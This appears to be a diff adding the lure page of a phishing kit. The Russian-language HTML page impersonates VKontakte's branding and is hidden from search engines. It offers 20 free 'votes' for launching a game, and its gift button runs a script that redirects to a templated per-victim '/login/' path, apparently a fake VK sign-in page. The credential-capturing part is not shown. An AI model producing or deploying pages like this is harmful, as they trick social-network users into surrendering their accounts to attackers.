@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="ru"><head>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="./vk/fav_logo.ico">
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <meta name="description" content="ВКонтакте – универсальное средство для общения и поиска друзей и одноклассников, которым ежедневно пользуются десятки миллионов человек. Мы хотим, чтобы друзья, однокурсники, одноклассники, соседи и коллеги всегда оставались в контакте.">
+    <link rel="preconnect" href="https://fonts.gstatic.com/">
+  
+    <link rel="stylesheet" href="../css/css2.css">
+    <link rel="stylesheet" href="../css/style.css">
+  
+    <title>ВКонтакте</title>
+</head>
+<body>
+    <header class="header">
+        <div class="container">
+            <a href="./base"><img src="https://cdn.glitch.me/e63fafad-3a36-4036-a5ad-9ce183ebe120%2Flogo.svg?v=1635527023492" alt="" class="header-logo"></a>
+        </div>
+    </header>
+    <div class="main">
+                                            <div class="container">
+                <svg class="icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 28 28"><path d="M0 14C0 6.268 6.268 0 14 0s14 6.268 14 14-6.268 14-14 14S0 21.732 0 14z" fill="#6bacf9"></path><path d="M17 10c3.5 0 4 4.5 4 6.5 0 1.5-.5 2.5-1.5 2.5-1.5 0-1.25-2.5-3.5-2.5h-4c-2.25 0-2.008 2.5-3.5 2.5-1 0-1.5-1-1.5-2.5 0-2 .5-6.5 4-6.5h6zm-6.47 1.75h-.06a.635.635 0 00-.314.067.455.455 0 00-.19.189.636.636 0 00-.066.313v.581h-.58a.71.71 0 00-.25.038l-.064.029a.454.454 0 00-.19.189.636.636 0 00-.066.313v.062c0 .137.023.232.067.313a.454.454 0 00.189.19.635.635 0 00.313.066H9.9v.58c0 .103.013.183.038.25l.029.064a.455.455 0 00.189.19.635.635 0 00.313.066h.062a.635.635 0 00.313-.067.454.454 0 00.19-.189.635.635 0 00.066-.313V14.1h.58a.71.71 0 00.25-.038l.064-.029a.454.454 0 00.19-.189.635.635 0 00.066-.313v-.062a.635.635 0 00-.067-.313.454.454 0 00-.189-.19.635.635 0 00-.313-.066H11.1v-.58a.71.71 0 00-.038-.25l-.029-.064a.454.454 0 00-.189-.19.635.635 0 00-.313-.066zm7.4 1.15h-1.36a.635.635 0 00-.314.067.454.454 0 00-.19.189.635.635 0 00-.066.313v.062c0 .137.023.232.067.313a.454.454 0 00.189.19.635.635 0 00.313.066h1.362a.635.635 0 00.313-.067.454.454 0 00.19-.189.635.635 0 00.066-.313v-.062a.635.635 0 00-.067-.313.454.454 0 00-.189-.19.635.635 0 00-.313-.066z" fill="#fff"></path></svg>
+                <h1 class="title">Запусти любую игру и получи подарок!</h1>
+                <p class="subtitle">Запустите любую игру из нашего <a href="https://vk.com/apps">списка</a> и получите 20 голосов, которые вы можете потратить на стикеры или покупки в играх.</p>
+                <button type="button" class="button"><span>Получить подарок</span><div class="pr" id="btn_lock" style="opacity: 1;"><div class="pr_bt"></div><div class="pr_bt"></div><div class="pr_bt"></div></div></button>
+            </div>
+                                            </div>
+    <script>
+        const button = document.querySelector('.button');
+        button.addEventListener('click', event => {
+            button.classList.add('load');
+            setTimeout(function() {
+                window.location.href = "<%= global.url %>/login/<%= id %>";
+            }, 500);
+        });
+    </script>
+
+</body></html>
